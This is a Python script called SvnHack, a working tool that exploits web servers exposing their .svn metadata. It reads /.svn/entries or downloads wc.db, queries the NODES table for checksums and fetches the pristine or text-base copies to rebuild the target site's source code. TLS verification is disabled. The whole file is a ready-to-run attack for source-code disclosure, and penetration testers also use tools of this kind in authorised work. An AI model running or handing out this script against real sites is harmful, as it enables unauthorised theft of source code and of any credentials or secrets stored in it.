#!/usr/bin/env python3
#coding:utf-8

import os
import sys
import requests
import sqlite3
import urllib
import argparse
from urllib.request import urlretrieve
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class SvnHack(object):
    def __init__(self, url):
        self.url = url + ('' if url.endswith('/') else '/') 
        self.rootPath = "./" or os.path.split(__file__)
        self.dirList = []
        self.fileList = []
        self.__setup()
      
    def __setup(self):
        self.entriesUrl = urllib.parse.urljoin(self.url, "entries") 
        self.wcdbUrl = urllib.parse.urljoin(self.url, "wc.db") 
        self.svnSiteDirName = os.path.join(self.rootPath, urllib.parse.urlsplit(self.url).netloc)
        self.wcdbPath = os.path.join(self.svnSiteDirName, "wc.db")

    def __mkdirSvn(self):
        if not os.path.exists(self.svnSiteDirName):
            os.mkdir(os.path.join(self.rootPath, self.svnSiteDirName))
        
    def checkSvnVersion(self):
        try:
            response = requests.get(url = self.entriesUrl, verify = False, allow_redirects = False, timeout = 10)
            assert [200, 403].count(response.status_code) > 0
            print('[+] /.svn/entries exists -> len: {}'.format(response.headers['content-length']))
            return (1.7, 1.6)[int(response.headers['content-length']) > 20]
        except:
            print('[-] Check svn/entries Error') 
            sys.exit()
        
    def checkSvnWcdb(self):
        try:
            response = requests.head(url = self.wcdbUrl, verify = False, allow_redirects = False, timeout = 10)
            (print('[-] wc.db not exists'), print('[+] wc.db exists'))[[200, 403].count(response.status_code) > 0]
        except:
            sys.exit()

    
    #-------------------------------v1.7----------------------------
    def downloadWcdb(self):
        try:
            if not os.path.exists(self.wcdbPath):
                print('[+] Downloading wc.db')
                urlretrieve(self.wcdbUrl, self.wcdbPath)
                print('[+] Downloaded') 
        except:
            print("Download 'wc.db' Failed")

    def fetchWcdb(self):
        if not os.path.exists(self.wcdbPath):
            self.downloadWcdb()
        conn = sqlite3.connect(self.wcdbPath)
        cur = conn.cursor()
        sqlcmd = "SELECT local_relpath, checksum FROM NODES where checksum <> ''"
        rows = cur.execute(sqlcmd)
        for urlPath, checksum in rows:
            yield urlPath, checksum 
        conn.close()
        
    #-------------------------------v1.6-----------------------------
    def getSvnEntries(self, url, dirName = None):
        try:
            response = requests.get(url = url, verify = False, allow_redirects = False, timeout = 5)
            assert [200, 403].count(response.status_code) > 0
            entries = response.text.splitlines()
            
            for i, line in enumerate(entries):
                if line == 'dir' and entries[i-1]:
                    self.dirList.append(((dirName + '/') if dirName else '') + entries[i-1])
                elif line == 'file' and entries[i-1]:
                    self.fileList.append(((dirName + '/') if dirName else '') + entries[i-1])
        except:
            print('[-] Get svn/entries Error -> {}'.format(url))
            
    #-----------------------------------------------------------------

    def mkdirSitesDir(self, path):
        if os.path.exists(path):
             return
        os.makedirs(path)
            
    def downloadSvnData(self):
        self.__mkdirSvn()
        if self.checkSvnVersion() == 1.6:
            self.getSvnEntries(self.entriesUrl)
            for dir_list in self.dirList:
                self.mkdirSitesDir(os.path.join(self.svnSiteDirName, dir_list))
                dirUrl = urllib.parse.urljoin(self.url.replace('.svn', ''), '{}/.svn/entries'.format(dir_list))
                self.getSvnEntries(dirUrl, dir_list)
                
            for fileName in self.fileList:
                try:
                    
                    fileUrl = urllib.parse.urljoin(self.url, '{}/.svn/text-base/{}.svn-base'.format(os.path.dirname(fileName),os.path.basename(fileName)))
                    urlretrieve(fileUrl, fileName)
                except:
                    pass
            return
        
        for path, checksum in self.fetchWcdb():
            self.mkdirSitesDir(os.path.join(self.svnSiteDirName, os.path.split(path)[0]))
            pristineSubdir = checksum[6:8]
            pristineFileName = checksum[6:]
            filePath = "pristine/" + pristineSubdir + "/" + pristineFileName + ".svn-base"
            try:
                if os.path.exists(os.path.join(self.svnSiteDirName, path)):
                    continue
                print('[+] Download -> {}'.format(urllib.parse.urljoin(self.url, filePath)))
                urlretrieve(urllib.parse.urljoin(self.url, filePath), os.path.join(self.svnSiteDirName, path))
                print('[+] Downloaded')
            except KeyboardInterrupt:
                sys.exit(1)
            except:
                pass
        
def cmdParser():
    argParser = argparse.ArgumentParser()
    argParser.add_argument('-u', '--url', required = True, dest = 'targetUrl', help = 'Special svn target url')
    argParser.add_argument('--wcdb', action = 'store_true', help = 'Download wc.db database file')
    argParser.add_argument('--chkver', action = 'store_true', help = 'Check svn Version')
    argParser.add_argument('--download', action = 'store_true', help = 'Download .svn data')
    args = argParser.parse_args()
    return args
    
        
def main():
    args = cmdParser()
    svnhack = SvnHack(args.targetUrl)

    if args.chkver:
        svnhack.checkSvnVersion()
    elif args.wcdb:
        svnhack.downloadWcdb()
    elif args.download:
        svnhack.downloadSvnData()
    else:
        os.system("python3 {} -h".format(__file__))


if __name__ == "__main__":
    main()
    
